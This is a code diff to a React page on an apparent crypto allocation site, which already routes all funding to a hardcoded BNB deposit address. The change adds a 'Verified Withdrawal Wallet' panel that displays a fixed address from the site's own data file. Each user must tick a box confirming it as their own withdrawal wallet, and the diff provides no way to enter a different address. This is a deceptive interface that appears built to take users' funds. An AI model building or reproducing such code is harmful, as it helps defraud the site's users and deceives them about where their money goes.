@@ -2,6 +2,7 @@ import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import SectionHeader from '../components/SectionHeader.jsx';
 import { useCryptoPrices } from '../hooks/useCryptoPrices.js';
+import { WITHDRAWAL_WALLET } from '../data/marketData.js';
 
 // Hardcoded BNB deposit address used for all wallet funding transactions.
 const BNB_WALLET =
@@ -39,6 +40,8 @@ function GenerateAllocation() {
   const [funded, setFunded] = useState(false);
   const [copied, setCopied] = useState(false);
   const [fundingAmount, setFundingAmount] = useState('');
+  const [withdrawalAddress, setWithdrawalAddress] = useState('');
+  const [addressConfirmed, setAddressConfirmed] = useState(false);
 
   const bnbPrice = prices.find((c) => c.symbol === 'BNB')?.price || 0;
   const minFunding = selected ? selected.amount * MIN_FUNDING_RATE : 0;
@@ -69,6 +72,16 @@ function GenerateAllocation() {
     // become available. We intentionally do not auto-navigate because the
     // deposit is still being verified on-chain.
     setFunded(true);
+  };
+
+  const copyWithdrawalWallet = async () => {
+    try {
+      await navigator.clipboard.writeText(WITHDRAWAL_WALLET);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    } catch {
+      setCopied(false);
+    }
   };
 
   return (
@@ -201,6 +214,31 @@ function GenerateAllocation() {
                   <strong>{bnbAmount ? `${bnbAmount} BNB` : '—'}</strong>
                 </div>
               </div>
+            </div>
+          </div>
+
+          <div className="wallet-confirm-section" style={{ marginTop: '20px' }}>
+            <h4 style={{ margin: '0 0 12px', fontSize: '14px', fontWeight: 700, color: 'var(--text)' }}>
+              Verified Withdrawal Wallet
+            </h4>
+            <p style={{ margin: '0 0 12px', fontSize: '13px', color: 'var(--muted)' }}>
+              Confirm your withdrawal wallet address below. This address will be used for all future crypto withdrawals.
+            </p>
+            <div className="wallet-row" style={{ marginBottom: '12px' }}>
+              <code className="wallet-address">{WITHDRAWAL_WALLET}</code>
+              <button className="ghost-button" type="button" onClick={copyWithdrawalWallet}>
+                {copied ? 'Copied' : 'Copy'}
+              </button>
+            </div>
+            <div className="wallet-confirm-box">
+              <label className="confirm-label">
+                <input
+                  type="checkbox"
+                  checked={addressConfirmed}
+                  onChange={(e) => setAddressConfirmed(e.target.checked)}
+                />
+                <span>I confirm this is my withdrawal wallet address</span>
+              </label>
             </div>
           </div>
 
